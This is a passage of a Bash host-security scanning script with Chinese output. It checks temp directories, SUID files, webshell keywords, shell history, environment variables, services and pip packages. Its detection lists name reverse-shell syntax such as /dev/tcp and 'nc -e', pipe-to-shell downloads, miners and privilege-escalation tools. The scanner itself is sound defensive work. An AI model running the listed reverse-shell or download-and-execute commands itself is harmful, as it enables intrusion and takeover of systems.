    record_raw_status 'filesystem-facts.jsonl' PARTIAL filesystem 'native filesystem facts unavailable; shell fallback used'
    record_raw_status 'filesystem-facts-summary.json' PARTIAL filesystem 'native filesystem facts unavailable; shell fallback used'
    record_raw_status 'persistence-paths.txt' NO_RESULTS filesystem 'native filesystem facts unavailable'
    [ "$rc" -eq 0 ] || mark_current_module_partial global_file_fact_scan_failed
}

check_filesystem() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    printf '{"profile":%s,"resource_profile":%s,"cpu_count":%s,"memory_mb":%s,"reason":%s}\n' \
        "$(json_quote "$SCAN_PROFILE")" "$(json_quote "${RESOURCE_PROFILE:-unknown}")" "${RESOURCE_CPU_COUNT:-0}" "${RESOURCE_MEMORY_MB:-0}" "$(json_quote "${RESOURCE_BUDGET_REASON:-unavailable}")" > "${RAW_DIR}/resource-budget.json"
    record_raw_status 'resource-budget.json' SUCCESS filesystem ''

    # YARA capability is initialized before any filesystem/static scan.  This
    # is deliberately independent from later realtime-event collection.
    if [ "$PROFILE_YARA_ENABLED" = true ]; then
        initialize_yara_capability
    else
        EVENT_SOURCE_YARA=DISABLED; YARA_CAPABILITY_ERROR="disabled_by_profile:${SCAN_PROFILE}"
        printf '{"status":"DISABLED","profile":%s,"mode":%s}\n' "$(json_quote "$SCAN_PROFILE")" "$(json_quote "$YARA_MODE")" > "${RAW_DIR}/yara-capability.json"
        record_raw_status 'yara-capability.json' NOT_APPLICABLE yara "$YARA_CAPABILITY_ERROR"
    fi
    if ! resource_budget_available file_monitoring; then
        FILE_SCAN_STATUS="PARTIAL_RESOURCE_BUDGET"
        record_raw_status 'file-changes.tsv' PARTIAL filesystem 'resource budget prevented file monitoring'
        mark_current_module_partial file_monitoring_resource_budget
        return 0
    fi
    if [ "$SCAN_PROFILE" = corpus-validation ]; then
        initialize_corpus_file_monitoring_artifacts
    else
        run_incremental_file_monitoring
    fi
    if [ "$PROFILE_STATIC_ANALYSIS" = true ]; then
        if resource_budget_available static_analysis; then
            benchmark_stage_begin static_analysis_pipeline
            scan_web_static_structures
            benchmark_stage_end static_analysis_pipeline
        else
            mark_current_module_partial static_analysis_resource_budget
        fi
    elif [ "$PROFILE_YARA_ENABLED" = true ]; then
        benchmark_stage_begin yara_pipeline
        build_static_candidate_list || true
        route_static_candidates
        scan_yara_candidates "$STATIC_YARA_CANDIDATE_FILE"
        benchmark_stage_end yara_pipeline
        printf 'path\tscore\treasons\tentropy\tlong_line\tsha256\tpackage_owner\tyara\n' > "${RAW_DIR}/web-static-analysis.tsv"
        printf '{"status":"DISABLED","profile":%s,"reason":"yara_only_mode"}\n' "$(json_quote "$SCAN_PROFILE")" > "${RAW_DIR}/static-analysis-summary.json"
        : > "${RAW_DIR}/static-analysis.jsonl"; : > "${RAW_DIR}/binary-analysis.jsonl"
        record_raw_status 'web-static-analysis.tsv' NOT_APPLICABLE filesystem 'yara_only_mode'
        record_raw_status 'static-analysis.jsonl' NOT_APPLICABLE filesystem 'yara_only_mode'
        record_raw_status 'binary-analysis.jsonl' NOT_APPLICABLE filesystem 'yara_only_mode'
    else
        printf 'path\tscore\treasons\tentropy\tlong_line\tsha256\tpackage_owner\tyara\n' > "${RAW_DIR}/web-static-analysis.tsv"
        printf '{"status":"DISABLED","profile":%s}\n' "$(json_quote "$SCAN_PROFILE")" > "${RAW_DIR}/static-analysis-summary.json"
        : > "${RAW_DIR}/static-analysis.jsonl"; : > "${RAW_DIR}/binary-analysis.jsonl"; : > "${RAW_DIR}/yara-results.jsonl"
        record_raw_status 'web-static-analysis.tsv' NOT_APPLICABLE filesystem "profile=${SCAN_PROFILE}"
        record_raw_status 'static-analysis.jsonl' NOT_APPLICABLE filesystem "profile=${SCAN_PROFILE}"
        record_raw_status 'binary-analysis.jsonl' NOT_APPLICABLE filesystem "profile=${SCAN_PROFILE}"
        record_raw_status 'yara-results.jsonl' NOT_APPLICABLE yara "profile=${SCAN_PROFILE}"
    fi
    echo -e "${BOLD}${MAGENTA}  [07/12] 文件系统${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    if [ "$SCAN_PROFILE" = corpus-validation ]; then
        : > "${RAW_DIR}/tmp_executables.txt"
        record_raw_status 'tmp_executables.txt' NOT_APPLICABLE filesystem 'isolated_corpus_profile'
        log_info 'corpus-validation 仅扫描显式清单，不遍历主机默认根、临时目录或运行时映射'
        return 0
    fi
    if [ "$PROFILE_DEEP_FILESYSTEM" != true ]; then
        check_lightweight_temp_executables
        log_info "${SCAN_PROFILE} 已完成高价值增量文件扫描；全盘 SUID/无属主/大文件遍历仅由 full 执行"
        return 0
    fi
    collect_filesystem_global_facts /

    # 1. 临时目录可执行文件
    echo -e "\n  ${BOLD}[1] 临时目录可执行文件 (/tmp, /dev/shm, /var/tmp):${NC}"
    local tmp_exe=$(collect_temp_code_candidates)
    if [ -n "$tmp_exe" ]; then
        echo "$tmp_exe" | while IFS= read -r line; do echo "    $line"; done
        local candidate_path candidate_type candidate_meta candidate_running candidate_sev candidate_type_name candidate_confidence
        while IFS=$'\t' read -r candidate_path candidate_type candidate_meta candidate_running; do
            [ -n "$candidate_path" ] || continue
            candidate_sev="OBSERVE"; candidate_type_name="SECURITY_ANOMALY"; candidate_confidence="LOW"
            if [ "$candidate_running" != "no" ]; then
                candidate_sev="HIGH"; candidate_type_name="SECURITY_ANOMALY"; candidate_confidence="MEDIUM"
            fi
            emit_find "$candidate_sev" "临时目录代码型可执行文件: $candidate_path" \
                "type=${candidate_type}; ${candidate_meta}; running=${candidate_running}" \
                "核对文件来源、哈希、创建时间和进程引用；确认恶意后再隔离处置"
            record_find "$candidate_sev" "filesystem" "临时目录代码型可执行文件: $candidate_path" \
                "type=${candidate_type}; ${candidate_meta}; running=${candidate_running}" \
                "核对来源、哈希和进程引用" "" "FS-TEMP-CODE" "$candidate_path" "tmp_executables.txt" \
                "$candidate_type_name" "$candidate_confidence" \
                "临时目录代码文件需要研判；未运行且无外连/持久化关联时不作为已确认威胁" \
                "若文件正在运行、关联外连/持久化或命中恶意哈希，应升级处置"
        done <<< "$tmp_exe"
    else
        log_info "临时目录未发现代码型可执行文件（已排除 SecScope 自身、AppleDouble 和 /dev/shm IPC 数据）"
    fi

    # 2. SUID/SGID 文件
    echo -e "\n  ${BOLD}[2] SUID/SGID 文件 (前20):${NC}"
    head -20 "$FILESYSTEM_SUID_ALL" | while read -r line; do
        echo "    $line ($(ls -la "$line" 2>/dev/null | awk '{print $1,$3,$4}'))"
    done

    # 在临时目录或 home 目录的 SUID 文件
    local weird_suid=$(cat "$FILESYSTEM_WEIRD_SUID_ALL" 2>/dev/null)
    if [ -n "$weird_suid" ]; then
        emit_find "CRITICAL" "临时目录或用户目录存在 SUID 文件" \
            "$weird_suid" \
            "SUID 在非系统目录是典型提权后门"
        record_find "CRITICAL" "backdoor" "异常 SUID 文件" "$weird_suid" "立即移除" "T1548.001"
        for f in $weird_suid; do add_ioc "File" "$f" "异常 SUID"; done
    fi

    # 3. 最近 7 天修改的系统文件
    echo -e "\n  ${BOLD}[3] 最近 7 天修改的系统文件 (前20):${NC}"
    local recent_system_changes="${RAW_DIR}/recent_system_changes.txt"
    if [ -s "${FILESYSTEM_RECENT_ALL:-}" ]; then
        awk -F '\t' '$1 ~ /^\/(bin|sbin|usr\/bin|usr\/sbin|etc|lib|lib64)(\/|$)/ {print $1}' "$FILESYSTEM_RECENT_ALL" | head -50 > "$recent_system_changes"
    else
        find /bin /sbin /usr/bin /usr/sbin /etc /lib /lib64 -mtime -7 -type f 2>/dev/null | head -50 > "$recent_system_changes"
    fi
    record_raw_status 'recent_system_changes.txt' "$([ -s "$recent_system_changes" ] && printf SUCCESS || printf NO_RESULTS)" filesystem ''
    head -20 "$recent_system_changes" | while read -r line; do
        echo "    $(stat -c '%y' "$line" 2>/dev/null || stat -f '%Sm' "$line" 2>/dev/null) $line"
    done

    # 4. 隐藏文件/目录
    echo -e "\n  ${BOLD}[4] /tmp/ 下隐藏文件和目录:${NC}"
    find /tmp -maxdepth 2 -name '.*' -not -name '.ICE-unix' -not -name '.X11-unix' -not -name '.XIM-unix' -not -name '.font-unix' -not -name '.Test-unix' 2>/dev/null | head -20 | while read line; do echo "    $line"; done

    # 5. 无属主文件
    echo -e "\n  ${BOLD}[5] 无属主文件 (前10):${NC}"
    head -10 "$FILESYSTEM_UNOWNED_ALL" | while read -r line; do echo "    $line"; done

    # 6. Web 目录 Webshell 关键字扫描
    echo -e "\n  ${BOLD}[6] Web 目录 Webshell 关键字扫描:${NC}"
    local web_dirs=("/var/www" "/usr/share/nginx" "/usr/local/nginx" "/home/*/www" "/home/*/html" "/opt/www")
    local ws_keywords='eval\(|base64_decode|shell_exec|system\(|assert\(|passthru|exec\(|popen\(|proc_open|create_function|preg_replace.*\/e|`.*`'
    local scanned=0 candidate hits extension
    for wd in "${web_dirs[@]}"; do
        # 展开通配符
        for dir in $wd; do
            if [ -d "$dir" ]; then
                if [ "$STATIC_CANDIDATE_STATUS" != AVAILABLE ]; then
                    mark_current_module_partial "web_keyword_candidates_${STATIC_CANDIDATE_STATUS}"
                    continue
                fi
                hits=""
                while IFS= read -r candidate; do
                    case "$candidate" in
                        "$dir"/*) ;;
                        *) continue ;;
                    esac
                    extension="${candidate##*.}"
                    case "$extension" in php|jsp|asp|aspx|py|pl) ;; *) continue ;; esac
                    if grep -Iq . "$candidate" 2>/dev/null && grep -qE "$ws_keywords" "$candidate" 2>/dev/null; then
                        hits="${hits}${hits:+$'\n'}${candidate}"
                        [ "$(printf '%s\n' "$hits" | wc -l)" -ge 20 ] && break
                    fi
                done < "${STATIC_CANDIDATE_FILE:-/dev/null}"
                if [ -n "$hits" ]; then
                    emit_find "MEDIUM" "Web 目录发现需人工确认的关键字文件: $dir" \
                        "$(echo "$hits" | head -5)" \
                        "检查文件内容是否为正常业务代码或 webshell"
                    record_find "MEDIUM" "webshell" "Web 目录关键字异常" "$hits" "检查是否为 webshell" "T1505.003" \
                        "WEB-STATIC-KEYWORD" "$dir" "module-filesystem.log,file-inventory-current.tsv" \
                        "SECURITY_ANOMALY" "LOW" \
                        'eval/system/base64_decode 等函数在正常 Web 应用和依赖中也很常见，关键字命中不能证明 WebShell' \
                        '若文件为基线新增并被 Web 进程执行、派生 Shell 或产生异常外连，应升级为安全威胁'
                fi
                scanned=$((scanned + 1))
            fi
        done
    done
    [ "$scanned" -eq 0 ] && log_info "未发现 Web 目录，跳过 webshell 扫描"

    # 7. 大文件 — 数据打包外传
    local big_files=$(head -15 "$FILESYSTEM_LARGE_ALL")
    if [ -n "$big_files" ]; then
        echo -e "\n  ${BOLD}[7] 大文件 (>200M, 非 /proc /sys):${NC}"
        echo "$big_files" | while read line; do
            echo "    $(du -h "$line" 2>/dev/null | awk '{print $1}')  $line"
        done
    fi

    # ---- 原始数据 ----
    [ -n "$tmp_exe" ] && printf '%s\n' "$tmp_exe" | dump_raw "tmp_executables.txt"
    rm -f -- "$FILESYSTEM_SUID_ALL" "$FILESYSTEM_WEIRD_SUID_ALL" "$FILESYSTEM_UNOWNED_ALL" "$FILESYSTEM_LARGE_ALL" "$FILESYSTEM_RECENT_ALL" "$FILESYSTEM_PERSISTENCE_ALL"

    log_info "文件系统检查完成"
}

#==============================================================================
# 08 — 命令历史与环境变量
#==============================================================================

check_history_env() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [08/12] 命令历史与环境变量${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # 命令历史可疑关键字
    local susp_cmds=('wget.*\.sh' 'curl.*\|.*sh' 'curl.*\|.*bash' '/dev/tcp/' '/dev/udp/'
        'nc -e.*bash' 'nc -e.*sh$' 'bash -i.*>&' 'chmod \+x.*/tmp' 'python.*http\.server' 'base64.*-d' 'openssl enc'
        'ssh.*-R' 'ssh.*-L' '\./miner' 'xmrig' './SRBMiner' 'git clone.*/tmp'
        'dirty(frag|pipe|cow)' 'pwnkit' 'linpeas' 'pspy(32|64)?' '(^|[/_.-])exploit([/_. -]|$)')
    local medium_signal_cmds=()
    local weak_signal_cmds=()
    local high_signal_cmds=()
    local combined_pattern
    combined_pattern=$(IFS='|'; echo "${susp_cmds[*]}")

    for home_dir in /root /home/*; do
        for hist in .bash_history .zsh_history .mysql_history .psql_history .python_history; do
            local hf="${home_dir}/${hist}"
            if [ -f "$hf" ] && [ -s "$hf" ]; then
                local user=$(basename "$home_dir") match
                while IFS= read -r match; do
                    [ -n "$match" ] || continue
                    if printf '%s' "$match" | grep -qiE 'dirty(frag|pipe|cow)|pwnkit|linpeas|pspy(32|64)?|(^|[/_.-])exploit([/_. -]|$)'; then
                        high_signal_cmds+=("$user:$hist:$match")
                    elif printf '%s' "$match" | grep -qiE '(curl|wget).*(\|[[:space:]]*(sh|bash)|&&[[:space:]]*(sudo[[:space:]]+)?(sh|bash))|/dev/(tcp|udp)/|nc -e.*(bash|sh)|bash -i.*>&|\./(miner|xmrig|SRBMiner)'; then
                        medium_signal_cmds+=("$user:$hist:$match")
                    else
                        weak_signal_cmds+=("$user:$hist:$match")
                    fi
                done < <(tail -n 20000 -- "$hf" 2>/dev/null | grep -inE "$combined_pattern" | tail -50)
            fi
        done
    done

    if [ "${#high_signal_cmds[@]}" -gt 0 ] || [ "${#medium_signal_cmds[@]}" -gt 0 ] || [ "${#weak_signal_cmds[@]}" -gt 0 ]; then
        echo -e "\n  ${BOLD}历史命令可疑项:${NC}"
        for item in "${high_signal_cmds[@]}" "${medium_signal_cmds[@]}" "${weak_signal_cmds[@]}"; do
            [ -n "$item" ] || continue
            echo "    $item"
        done
        for item in "${high_signal_cmds[@]}"; do
            record_find "HIGH" "history" "历史命令出现疑似提权或利用工具" "${item:0:500}" \
                "核实是否为授权测试；检查对应文件、执行时间和后续提权行为" "T1068" \
                "HIS-EXPLOIT-TOOL" "$(normalize_identity_text "$item")" "shell_history.txt,audit_auth_exec_events.txt" \
                "SECURITY_ANOMALY" "MEDIUM" "命令历史包含高信号工具名称，但历史记录本身不能证明成功执行或恶意意图" \
                "若审计日志确认执行并伴随提权、落地文件或持久化，应升级为安全威胁"
        done
        if [ "${#medium_signal_cmds[@]}" -gt 0 ]; then
            local history_evidence
            history_evidence=$(printf '%s\n' "${medium_signal_cmds[@]}" | head -10)
            record_find "MEDIUM" "history" "历史命令含下载执行或反向连接特征" "$history_evidence" \
                "审查操作记录并结合审计日志确认是否实际执行" "T1059" \
                "HIS-SUSPICIOUS-COMMAND" "suspicious-command-history" "shell_history.txt,audit_auth_exec_events.txt" \
                "SECURITY_ANOMALY" "LOW" "命令历史出现组合型危险语法，但尚无执行结果和后续行为证据" \
                "若审计日志确认执行并产生异常进程、外连或文件落地，应升级处置"
        fi
        if [ "${#weak_signal_cmds[@]}" -gt 0 ]; then
            local weak_history_evidence
            weak_history_evidence=$(printf '%s\n' "${weak_signal_cmds[@]}" | head -10)
            record_find "OBSERVE" "history" "历史命令含需复核的管理操作" "$weak_history_evidence" \
                "结合变更记录按需抽查；base64 解码、端口转发或临时 HTTP 服务可用于正常运维" "" \
                "HIS-ADMIN-REVIEW" "history-admin-review" "shell_history.txt,audit_auth_exec_events.txt" \
                "SECURITY_ANOMALY" "LOW" "单一通用管理命令歧义较大，仅作为观察线索" \
                "若与未授权账号、异常时间、恶意文件或网络行为关联，应提高风险等级"
        fi
    else
        log_info "命令历史检查通过"
    fi

    # 检查 .bash_history 是否被链接到 /dev/null
    for home_dir in /root /home/*; do
        local hf="${home_dir}/.bash_history"
        if [ -L "$hf" ]; then
            local link_target=$(readlink "$hf" 2>/dev/null)
            if [ "$link_target" = "/dev/null" ]; then
                emit_find "MEDIUM" "命令历史被重定向到 /dev/null: $hf" \
                    "该配置会降低审计可见性，但也可能是管理员隐私或运维配置" \
                    "核对配置变更时间、来源以及同期登录和执行行为"
                record_find "MEDIUM" "history" "历史记录被关闭" "$hf -> /dev/null" "核对配置来源并恢复审计能力" "T1562.003" \
                    "HIS-HISTORY-DISABLED" "$hf" "shell_history.txt,file-changes.tsv" "SECURITY_ANOMALY" "LOW" \
                    '历史关闭本身是审计弱化配置，不能单独证明攻击者清除痕迹' \
                    '若该配置近期由异常进程修改，且同期出现陌生登录或高风险命令，应升级处置'
            fi
        fi
    done

    # HISTFILE 检测
    echo -e "\n  ${BOLD}HISTFILE 配置:${NC}"
    for home_dir in /root /home/*; do
        for pf in .bashrc .bash_profile .profile; do
            local fp="${home_dir}/${pf}"
            if [ -f "$fp" ]; then
                local hist_disable=$(grep -E 'HISTFILE=|HISTSIZE=0|HISTFILESIZE=0|unset.*HISTFILE' "$fp" 2>/dev/null)
                if [ -n "$hist_disable" ]; then
                    emit_find "MEDIUM" "命令历史被禁用: $fp" \
                        "$hist_disable" \
                        "检查是否被攻击者修改"
                    record_find "MEDIUM" "history" "历史被禁用" "$fp: $hist_disable" "核对配置来源并恢复正常记录" "T1562.003" \
                        "HIS-HISTORY-DISABLED" "$fp" "shell_history.txt,file-changes.tsv" "SECURITY_ANOMALY" "LOW" \
                        'HISTFILE/HISTSIZE 配置可能由管理员主动设置，单一配置不能证明入侵' \
                        '若文件近期由异常进程修改并伴随陌生会话或提权行为，应升级处置'
                fi
            fi
        done
    done

    # 环境变量
    echo -e "\n  ${BOLD}全局环境变量:${NC}"
    env 2>/dev/null | grep -E 'LD_PRELOAD|LD_LIBRARY_PATH|PROMPT_COMMAND|BASH_ENV|PYTHONPATH|PERL5LIB|RUBYLIB' | while read line; do
        echo -e "    ${YELLOW}$line${NC}"
    done

    # 检查 /etc/environment /etc/profile 中的环境变量注入
    local env_injection=$(grep -E 'LD_PRELOAD|LD_LIBRARY_PATH' /etc/environment /etc/profile /etc/profile.d/*.sh 2>/dev/null | grep -v '^#' | head -10)
    if [ -n "$env_injection" ]; then
        emit_find "HIGH" "系统环境变量含 LD_PRELOAD/LD_LIBRARY_PATH 配置" \
            "$env_injection" \
            "核对库路径、文件权限、包归属及实际加载情况"
        record_find "HIGH" "persistence" "动态库环境变量配置" "$env_injection" "核对库来源和实际加载" "T1574.006" \
            "PER-LD-ENV-CONFIG" "ld-env-config" "current_env.txt,file-changes.tsv,proc/" "SECURITY_ANOMALY" "MEDIUM" \
            'LD_LIBRARY_PATH 可用于正常运行时，LD_PRELOAD 也可能用于合法调试；仅存在配置不足以判定 rootkit' \
            '若指向临时或可写路径、库已由特权进程加载或配置近期被异常进程修改，应升级为安全威胁'
    fi

    # ---- 原始数据 ----
    dump_raw "current_env.txt" env
    # 收集所有用户的 history 文件
    {
        for hd in /root /home/*; do
            for hf in .bash_history .zsh_history; do
                f="${hd}/${hf}"
                [ -f "$f" ] && echo "=== $f (tail 200) ===" && tail -200 "$f" 2>/dev/null && echo ""
            done
        done
    } | dump_raw "shell_history.txt"

    log_info "命令历史与环境变量检查完成"
}

#==============================================================================
# 09 — 服务与供应链
#==============================================================================

collect_web_runtime_baseline() {
    local current="${RAW_DIR}/web-runtime-baseline.tsv" path hash owner mode kind key old_hash old_line
    WEB_RUNTIME_BASELINE_FILE="${STATE_DIR}/web-runtime-baseline.state"
    printf 'runtime\tkind\tpath\tsha256\towner\tmode\tpackage_owner\ttrust\n' > "$current"
    for path in /etc/nginx/nginx.conf /etc/nginx/conf.d/*.conf /etc/nginx/modules-enabled/* /usr/lib/nginx/modules/*.so /usr/lib64/nginx/modules/*.so /etc/apache2/apache2.conf /etc/apache2/mods-enabled/* /etc/httpd/conf/httpd.conf /etc/httpd/conf.modules.d/*.conf /usr/lib/apache2/modules/*.so /etc/tomcat*/web.xml /var/lib/tomcat*/webapps/*/WEB-INF/web.xml /etc/php/*/fpm/pool.d/*.conf /etc/php-fpm.d/*.conf; do
        [ -f "$path" ] || continue; WEB_RUNTIME_OBSERVED=$((WEB_RUNTIME_OBSERVED+1))
        case "$path" in *nginx*) kind=nginx ;; *apache*|*httpd*) kind=apache ;; *tomcat*|*WEB-INF*) kind=tomcat ;; *) kind=php-fpm ;; esac
        hash=$(sha256_file "$path" 2>/dev/null || true); owner=$(stat -c '%U:%G' -- "$path" 2>/dev/null || stat -f '%Su:%Sg' -- "$path" 2>/dev/null || echo unknown); mode=$(stat -c '%a' -- "$path" 2>/dev/null || stat -f '%Lp' -- "$path" 2>/dev/null || echo unknown); key=$(base64_one_line "$path")
        local package_owner=""; package_owner=$(file_package_owner "$path"); local trust=PACKAGE_MANAGED; [ -n "$package_owner" ] || trust=UNMANAGED; [[ "$mode" =~ [2367][0-9]$ || "$mode" =~ [0-9][2367]$ ]] && trust=USER_WRITABLE
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$kind" "$([ "$path" = "${path%.so}" ] && printf configuration || printf module)" "$path" "$hash" "$owner" "$mode" "${package_owner:-unowned}" "$trust" >> "$current"
        if [ -s "$WEB_RUNTIME_BASELINE_FILE" ]; then
            old_line=$(awk -F'|' -v k="$key" '$1==k{print;exit}' "$WEB_RUNTIME_BASELINE_FILE"); old_hash=$(printf '%s' "$old_line" | awk -F'|' '{print $2}')
            if [ -n "$old_line" ] && [ "$old_hash" != "$hash" ]; then
                WEB_RUNTIME_CHANGES=$((WEB_RUNTIME_CHANGES+1))
                record_find MEDIUM config "Web 运行时配置/模块哈希变化: $path" "previous_sha256=$old_hash; current_sha256=$hash; owner=$owner; mode=$mode; package=${package_owner:-unowned}; trust=$trust" '核对发布单、包管理记录、属主和加载路径；维护窗口只降低弱变更信号' '' 'WEB-RUNTIME-BASELINE-CHANGED' "path:$path" 'web-runtime-baseline.tsv' 'CONFIG_BASELINE' MEDIUM '跨轮 Web 配置或模块哈希变化' '若用户可写、非包管理且关联 Web 子进程/网络/恶意哈希，则升级为安全威胁' 'WEB,INTEGRITY' "维护窗口=${MAINTENANCE_ACTIVE}"
            fi
        fi
    done
    if [ "$WEB_RUNTIME_OBSERVED" -eq 0 ]; then WEB_RUNTIME_BASELINE_HEALTH=NOT_APPLICABLE; record_raw_status 'web-runtime-baseline.tsv' NO_RESULTS services 'no_supported_web_runtime'; return 0; fi
    if [ "$STATE_ENABLED" != true ]; then WEB_RUNTIME_BASELINE_HEALTH=DISABLED; chmod 600 "$current"; record_raw_status 'web-runtime-baseline.tsv' SUCCESS services ''; return 0; fi
    local pending="${STATE_DIR}/.web-runtime.next.${RUN_ID}"; : > "$pending"
    tail -n +2 "$current" | while IFS=$'\t' read -r runtime kind path hash rest; do printf '%s|%s|%s|%s\n' "$(base64_one_line "$path")" "$hash" "$runtime" "$RUN_STARTED_AT"; done > "$pending"
    WEB_RUNTIME_BASELINE_HEALTH=$([ -s "$WEB_RUNTIME_BASELINE_FILE" ] && printf HEALTHY || printf LEARNING)
    chmod 600 "$current" "$pending"; record_raw_status 'web-runtime-baseline.tsv' SUCCESS services ''
}

commit_web_runtime_baseline() {
    local pending="${STATE_DIR}/.web-runtime.next.${RUN_ID}"
    [ "$STATE_ENABLED" = true ] && [ -s "$pending" ] || return 0
    [ ! -s "$WEB_RUNTIME_BASELINE_FILE" ] || cp "$WEB_RUNTIME_BASELINE_FILE" "${WEB_RUNTIME_BASELINE_FILE}.bak"
    mv "$pending" "$WEB_RUNTIME_BASELINE_FILE"; chmod 600 "$WEB_RUNTIME_BASELINE_FILE" "${WEB_RUNTIME_BASELINE_FILE}.bak" 2>/dev/null || true
}

check_services() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [09/12] 服务与供应链${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # 所有运行中的服务
    echo -e "\n  ${BOLD}运行中的服务:${NC}"
    systemctl list-units --type=service --state=running 2>/dev/null | head -30 | while read line; do echo "    $line"; done

    # 不常见的服务名
    local weird_services=$(systemctl list-units --type=service --state=running --no-legend --no-pager --plain 2>/dev/null \
        | awk '$1 ~ /[.]service$/ {print $1}' \
        | grep -vE '^(systemd-|sshd|nginx|apache|httpd|mysql|mariadb|postgres|redis|docker|containerd|kube|php|cron|rsyslog|journal|network|audit|firewalld|ufw|fail2ban|supervisor|monit|ntp|chrony|named|postfix|dovecot|vsfptd|samba|snmpd|zabbix|prometheus|node_exporter|filebeat|fluentd|datadog)' || true)
    if [ -n "$weird_services" ]; then
        echo -e "\n  ${YELLOW}非标准服务:${NC}"
        echo "$weird_services" | while read line; do echo "    $line"; done
    fi

    # Docker 安全检查
    if command -v docker &>/dev/null; then
        echo -e "\n  ${BOLD}Docker 容器:${NC}"
        docker ps -a --format 'table {{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}' 2>/dev/null | head -20 | while read line; do echo "    $line"; done

        # Privileged 容器
        local docker_security
        docker_security=$(docker ps -q 2>/dev/null | xargs -r docker inspect --format '{{.Name}}\timage={{.Config.Image}}\tprivileged={{.HostConfig.Privileged}}\tpid_mode={{.HostConfig.PidMode}}\tnetwork_mode={{.HostConfig.NetworkMode}}\treadonly_rootfs={{.HostConfig.ReadonlyRootfs}}' 2>/dev/null)
        [ -n "$docker_security" ] && printf '%s\n' "$docker_security" | dump_raw "docker_security.txt"
        # Kubernetes pause 容器继承 Pod sandbox 配置，不单独重复计数；保留实际工作负载容器。
        local priv_containers=$(printf '%s\n' "$docker_security" | grep -i $'privileged=true' | grep -vE '^/k8s_POD_' || true)
        if [ -n "$priv_containers" ]; then
            emit_find "HIGH" "存在 Privileged Docker 容器" \
                "$priv_containers" \
                "privileged 容器可以逃逸到宿主机，确认为必要后保留"
            record_find "HIGH" "baseline" "Privileged 容器" "$priv_containers" "审查必要性并减少宿主机权限" "T1611" \
                "BAS-CONTAINER-PRIVILEGED" "privileged-container" "docker_security.txt,running_services.txt"
        fi
    fi

    # PIP 供应链检查
    echo -e "\n  ${BOLD}Python 包 (pip list 前20):${NC}"
    pip list 2>/dev/null | head -20 | while read line; do echo "    $line"; done
    pip3 list 2>/dev/null | head -20 | while read line; do echo "    $line"; done

    # 异常 Python 包（可能是 typo-squatting 攻击）
    if command -v pip &>/dev/null; then
        local susp_pkgs=$(pip list 2>/dev/null | awk '{print $1}' | grep -iE '^request[^s]|^crypt[^o]|^pycrypt|^beautifulsoup|^tensorflo[^w]|^reques[t]$|^urlib|^malwares' | head -5)
        [ -n "$susp_pkgs" ] && emit_find "MEDIUM" "可疑 Python 包名" "$susp_pkgs" "检查是否为 typo-squatting 供应链攻击" && record_find "MEDIUM" "supplychain" "可疑 PyPI 包" "$susp_pkgs" "核实包名" "T1195.002"
    fi

    # 最近安装的包
    echo -e "\n  ${BOLD}最近安装的包:${NC}"
    case "${PKG_MGR}" in
        dpkg) grep 'install ' /var/log/dpkg.log 2>/dev/null | tail -10 | while read line; do echo "    $line"; done ;;
        rpm)  rpm -qa --last 2>/dev/null | head -10 | while read line; do echo "    $line"; done ;;
    esac

    # ---- 原始数据 ----
    dump_raw "running_services.txt" systemctl list-units --type=service --state=running
    dump_raw "recent_packages.txt" bash -c "case '${PKG_MGR}' in dpkg) grep 'install ' /var/log/dpkg.log 2>/dev/null | tail -30 ;; rpm) rpm -qa --last 2>/dev/null | head -30 ;; esac"

    collect_web_runtime_baseline
    log_info "服务与供应链检查完成"
}

#==============================================================================
# 实时事件输入与归一化（Falco -> auditd -> journald audit，全部可选）
#==============================================================================

event_domain_for_text() {
    local text
    text=$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]')
    case "$text" in
        *memfd*|*ptrace*|*process_vm_writev*|*/proc/*/mem*|*rwx*) printf 'MEMORY' ;;
        *connect*|*socket*|*network*) printf 'NETWORK' ;;
        *cron*|*systemd*|*authorized_keys*|*sudoers*|*pam.d*|*ld.so.preload*) printf 'PERSISTENCE' ;;
        *nginx*|*apache*|*httpd*|*php-fpm*|*tomcat*|*gunicorn*|*uwsgi*|*caddy*|*litespeed*|*http*) printf 'WEB' ;;
        *open*|*write*|*rename*|*unlink*|*chmod*|*file*) printf 'FILE' ;;
        *login*|*auth*|*sshd*|*sudo*) printf 'AUTH' ;;
        *module*|*ima*) printf 'INTEGRITY' ;;
        *) printf 'PROCESS' ;;
    esac
}

event_action_for_text() {
    local text
    text=$(printf '%s' "$1" | tr '[:upper:]' '[:lower:]')
    case "$text" in
        *memfd*) printf 'memfd' ;; *ptrace*) printf 'ptrace' ;; *process_vm_writev*) printf 'process_vm_writev' ;;
        *setns*) printf 'setns' ;; *unshare*) printf 'unshare' ;; *module*load*|*init_module*|*finit_module*) printf 'module_load' ;;
        *connect*) printf 'connect' ;; *rename*) printf 'rename' ;; *unlink*|*delete*) printf 'unlink' ;;
        *chmod*) printf 'chmod' ;; *open*|*write*) printf 'file_access' ;; *execve*|*spawn*|*process*) printf 'execve' ;;
        *login*|*auth*) printf 'auth' ;; *) printf 'other' ;;
    esac
}

append_normalized_event() {
    local epoch="$1" source="$2" action="$3" domain="$4" pid="$5" ppid="$6" uid="$7" exe="$8" path="$9" target="${10}" details="${11}" supplied_event_id="${12:-}"
    local event_id process_instance="" parent_instance="" file_entity="" network_flow="" entity_type="GENERIC" entity_id=""
